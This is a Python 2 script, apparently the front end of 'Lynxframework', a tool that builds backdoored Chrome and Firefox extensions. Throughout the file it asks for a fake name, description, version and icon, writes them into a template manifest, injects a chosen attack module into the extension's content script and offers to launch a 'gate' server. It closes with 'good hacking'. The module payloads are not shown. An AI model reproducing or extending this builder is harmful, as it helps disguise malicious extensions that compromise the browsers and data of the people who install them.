#!usr/bin/env	python3

import os,sys
import shutil
import errno
import glob

def copy(src, dest):
    try:
        shutil.copytree(src, dest)
    except OSError as e:
        if e.errno == errno.ENOTDIR:
            shutil.copy(src, dest)
        else:
            print('Directory not copied. Error: %s' % e)

def load_module(backdoor_name):
	action = 0
	print "[+] Loading..."
	print "---------------"
	directory_list = glob.glob('includes/module/*.lframework')
	for line in directory_list:
		print "-> " + line.split('includes/module/')[1].split('.lframework')[0]
	print "---------------"
	while action == 0:
		user_input =  raw_input('\nName of module ? ')
		if os.path.isfile('includes/module/'+user_input+'.lframework'):
			load_module_content  = open('includes/module/'+user_input+'.lframework').read()
			if os.path.isfile('output/' + backdoor_name + '/js/check.js'):
				load_check = open('output/' + backdoor_name + '/js/check.js', 'w').close()
				load_check = open('output/' + backdoor_name + '/js/check.js', 'a+')
				original_check = open('includes/exploit/chrome/js/check.js')
			elif os.path.isfile('output/' + backdoor_name + '/data/content.js'):
				load_check = open('output/' + backdoor_name + '/data/content.js', 'w').close()
				load_check = open('output/' + backdoor_name + '/data/content.js', 'a+')
				original_check = open('includes/exploit/firefox/data/content.js')
			if original_check != '':
				for line in original_check:
					if "//MODULE//" in line:
						line = line.replace("//MODULE//", load_module_content)
					load_check.write(line)
				print '[+] Module writed! '
				user_input = raw_input("[+] Start gate? [Y/n]")
				if user_input == '' or user_input == 'Y' or user_input == 'y':
					if os.path.isfile('Lynxgate.py'):
						os.system('python Lynxgate.py')
					else:
						print "[!] Gate not found."
				print "[~] Bye, & good hacking."
				action = 1

def making(information_array):
	output_name = raw_input('Output Name : ')
	if output_name != '':
		if information_array['type_backdoor'] == 'G':
			print "\n[~] Google Chrome"
			copy('includes/exploit/chrome', 'output/'+output_name)
			if os.path.isfile('includes/exploit/icons/' + information_array['icon']):
				copy('includes/exploit/icons/' + information_array['icon'], 'output/'+output_name+'/img/')
			elif os.path.isfile(information_array['icon']):
				copy(information_array['icon'], 'output/'+output_name+'/img/')
			print "[%] Pattern copied"
			# INSERT BACKDOOR_INFORMATION ASPECT
			if(os.path.isfile('output/' + output_name + '/manifest.json')):
				basic_manifest = open('includes/exploit/chrome/manifest.json')
				erase_file = open('output/' + output_name + '/manifest.json', 'w').close()
				new_manifest = open('output/' + output_name + '/manifest.json', 'a+')
				for line in basic_manifest:
					if "//NAME//" in line:
						line = line.replace("//NAME//", information_array['title'])
						print "[+] Setup name.."
					if "//DESCRIPTION//" in line:
						line = line.replace("//DESCRIPTION//", information_array['description'])
						print "[+] Setup description"
					if "//VERSION//" in line:
						line = line.replace("//VERSION//", information_array['version'])
					if "@@ICON@@" in line:
						line = line.replace("@@ICON@@", information_array['icon'])
					new_manifest.write(line)
			# LOAD MODULE
			user_input = raw_input('\nLoad Module ? [Y/n]: ')
			if user_input == '' or user_input == 'Y' or user_input == 'y':
				load_module(output_name)
			else:
				print "\n[~] Bye, & good hacking."


		elif information_array['type_backdoor'] == 'F':
			print "[~] Mozilla Firefox"

def backdooring(backdoor_type):
	backdoor_information = {}
	backdoor_information['title'] = ""
	backdoor_information['description'] = ""
	backdoor_information['version'] = ""
	backdoor_information['icon'] = ""
	backdoor_information['type_backdoor'] = backdoor_type
	action = 0

	print "[+] Now configuring aspect..."
	while action == 0:
		backdoor_information['title'] = raw_input('Backdoor Name : ')
		if backdoor_information['title'] != '':
			backdoor_information['description'] = raw_input('Backdoor Description : ')
			if backdoor_information['description'] != '':
				backdoor_information['version'] = raw_input('Backdoor Version : ')
				if backdoor_information['version'] != '':
					backdoor_information['icon'] = raw_input('Backdoor Icon (includes/exploit/icon/default.png) : ')
					if backdoor_information['icon'] == '':
						backdoor_information['icon'] = "default.png"
					if backdoor_information['icon'] != '':
						if os.path.isfile('includes/exploit/icons/' + backdoor_information['icon']):
							start = 1
						elif os.path.isfile(backdoor_information['icon']):
							start = 1
						else:
							start = 0
						if start == 1:
							print "[+] Generation...."
							action = 1
							making(backdoor_information)
						else:
							print "[-] Icon not found"

def generate_backdoor():
	print "-> [G]oogle Chrome"
	print "-> [M]ozilla Firefox"
	user_input = raw_input('\nLynxframework > ')

	if user_input == 'g' or user_input == 'G':
		backdooring('G')
	elif user_input == 'f' or user_input == 'F':
		backdooring('F')

def menu():
	print "-> [G]enerate a extension backdoored."
	print "-> [L]oad a lframework module."
	print "-> [C]ompact extension with backdoor."
	user_input = raw_input('\nLynxframework > ')
	if user_input == 'g' or user_input == 'G':
		generate_backdoor()

def main():
	logo = """
"BQQQQQ,                                        pQQQQR^
  "BQQQQQQy                                 .yQQQQQR^  
    ^BQQQQQQQQ                           ,QQQQQQQR^    
      @BQQQQQQQQQ,      .,gQQy,,      ;QQQQQQQQQQn     
      @QQRQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQR@QQ      
      |QQQ RQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQR QQQR      
       @QQQQQRQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ       
       \QQQQQQQRQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ       
        ^RQQQ@QQQQQQQQQQQQQQQQQQQQQQQR#RRQQQQRR        
           |BQQQQQQQQQQQQQQQQQQQQQQQRQQQQQQQ           
          QQQQRR#QQQQQQQQQQQQQQQQQRQQQQQQQQQQ,         
        jQQQQQQQQQDRQQQQQQQQQQQ#RQRRDQQQQQQQQQQ        
       '   #QQQQQQQ  'RRQQQQQQRRR   @QQQQQQQ `^^       
          jQQQQQQQQQQQS |RQQQQQ @QQQQQQQQQQQQ          
         jQQQQQQQR#Rn  @QQQQQQQQ,'RE##QQQQQQQQ         
        jQQQQQQQQQSR^;QQQQRRRQQQQQ2B#QQQQQQQQQQ        
       jQQQQSRR^yQQQRjRQQQQQQQQQQQ8QQyy^RB#QQQQQ       
      |RR^      @QR @Q#R       8@QQ RQQ      "RBQ      
                Bk   @Qy       @Q#   '8                
                      \QQQ, yQQQR                      
                       7 RQQQR7R                       
                          'RR                          
                                                                    
	"""
	print logo
	try:
		menu()
	except:
		print "\nGood Bye ^^' "

main()
